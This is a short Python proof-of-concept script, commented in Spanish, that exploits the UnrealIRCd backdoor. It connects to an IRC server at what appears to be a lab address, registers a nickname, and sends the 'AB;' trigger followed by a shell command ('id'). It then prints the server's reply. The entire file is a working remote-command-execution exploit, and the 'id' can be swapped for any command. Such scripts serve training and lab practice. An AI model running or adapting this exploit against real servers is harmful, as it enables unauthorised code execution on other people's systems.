#!/usr/bin/env python3
"""
PoC manual UnrealIRCd backdoor exploit
Author: Javier
Date: 2025-08-08
"""

import socket
import time

# 🎯 Objetivo
TARGET = "192.168.56.102"
PORT = 6667

# 🧠 Comandos IRC + payload
commands = [
    "NICK pwn\r\n",
    "USER pwn 0 * :pwn\r\n",
    "AB;id\r\n"  # AB; activa la backdoor, id se ejecuta en el sistema remoto
]

try:
    # 🔌 Crear socket TCP
    with socket.create_connection((TARGET, PORT), timeout=5) as s:
        for cmd in commands:
            s.sendall(cmd.encode())
            time.sleep(1)  # Espera entre comandos
        # 🧾 Recibir respuesta
        response = s.recv(4096)
        print("[+] Respuesta del servidor:")
        print(response.decode(errors="ignore"))
except Exception as e:
    print(f"[!] Error al conectar o enviar datos: {e}")
